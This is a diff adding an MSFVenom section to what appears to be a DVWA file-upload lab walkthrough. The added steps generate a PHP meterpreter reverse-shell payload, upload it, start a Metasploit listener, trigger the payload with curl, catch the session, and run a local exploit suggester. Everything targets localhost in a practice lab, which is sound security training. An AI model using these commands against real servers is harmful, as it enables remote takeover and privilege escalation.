@@ -118,7 +118,7 @@ We can also use [`weevely3`](https://github.com/epinna/weevely3) to get a revers
 
 2. Upload it to the webserver:
 
-    ![](weevely_upload.png){: width='65%'}
+    ![](weevely_upload.png){: width='75%'}
 
 3. Call it through the terminal:
 
@@ -137,6 +137,85 @@ We can also use [`weevely3`](https://github.com/epinna/weevely3) to get a revers
     php-reverse-shell.php
     php-reverse-shell.php.png
     weevely.php
+    ```
+
+### MSFVenom
+
+1. We can also craft our own payload with `msfvenom`:
+
+    ```shell
+    msfvenom -p php/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f raw > revshell.php
+    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+    [-] No arch selected, selecting arch: php from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 1110 bytes
+    ```
+
+    ![](msfvenom_payload.png)
+
+2. Upload the file:
+
+    ![](msfvenom_upload.png)
+
+3. Set up the a listener within `msfconsole`:
+
+```shell
+msfconsole -q
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 127.0.0.1
+lhost => 127.0.0.1
+msf6 exploit(multi/handler) >
+msf6 exploit(multi/handler) > run
+
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444
+```
+
+4. Call the uploaded `msfvenom` payload:
+
+    ```shell
+    curl http://127.0.0.1:42001/hackable/uploads/revshell.php
+    ```
+
+5. Catch the reverse shell:
+
+    ```shell
+    msf6 exploit(multi/handler) > run
+
+    [!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+    [*] Started reverse TCP handler on 127.0.0.1:4444
+    [*] Sending stage (39927 bytes) to 127.0.0.1
+    [*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:46378) at 2023-12-10 13:31:06 +0000
+
+    meterpreter >
+    ```
+
+6. As an extra step, we could then use one of the MSF's post-exploitation modules, such as the [Local Exploit Suggester](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/), to check our options for lateral movement, privilege escalation, crendential gathering, etc.
+
+    ```shell
+    meterpreter > bg
+    [*] Backgrounding session 1...
+    msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+    msf6 post(multi/recon/local_exploit_suggester) > show options
+
+    Module options (post/multi/recon/local_exploit_suggester):
+
+    Name             Current Setting  Required  Description
+    ----             ---------------  --------  -----------
+    SESSION                           yes       The session to run this module on
+    SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+
+    View the full module info with the info, or info -d command.
+
+    msf6 post(multi/recon/local_exploit_suggester) > set session 1
+    session => 1
+    msf6 post(multi/recon/local_exploit_suggester) > run
+
+    [*] 127.0.0.1 - Collecting local exploits for php/linux...
     ```
 
 ## Security: Medium
